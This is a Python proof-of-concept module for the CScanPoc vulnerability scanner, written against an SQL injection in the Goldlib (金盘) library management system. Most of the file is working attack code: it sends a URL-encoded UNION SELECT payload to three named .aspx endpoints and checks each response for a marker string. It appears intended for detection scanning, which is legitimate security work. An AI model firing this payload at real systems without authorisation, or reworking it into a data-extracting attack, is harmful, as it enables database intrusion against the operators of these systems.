# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Goldlib_0007'  # 平台漏洞编号，留空
    name = '金盘通用型资料管理系统 SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-04-02'  # 漏洞公布时间
    desc = '''
        金盘通用型资料管理系统多处SQL注射漏洞：
        '/HotCollection.aspx?Call=Z',
        '/HotGrade.aspx?Call=Z',
        '/HotBroow.aspx?Call=TH'
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金盘软件'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fe4f0337-02a3-41bb-b367-6eeea0684255'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-055323
            # refer:http://www.wooyun.org/bugs/wooyun-2010-083240
            hh = hackhttp.hackhttp()
            payloads = [
                '/HotCollection.aspx?Call=Z',
                '/HotGrade.aspx?Call=Z',
                '/HotBroow.aspx?Call=TH'
            ]
            getdata = '%27%20union%20all%20select%20null%2Cnull%2Cnull%2CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2888%29%7C%7CCHR%28112%29%7C%7CCHR%2884%29%7C%7CCHR%2888%29%7C%7CCHR%2885%29%7C%7CCHR%2889%29%7C%7CCHR%2869%29%7C%7CCHR%28116%29%7C%7CCHR%28110%29%7C%7CCHR%28103%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%2Cnull%2Cnull%2Cnull%20FROM%20DUAL--'
            for payload in payloads:
                url = self.target + payload + getdata
                code, head, res, errcode, _ = hh.http(url)

                if code == 200 and 'qpvjqXpTXUYEtngqkjkq' in res:
                    #security_hole(arg+payload+'   :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
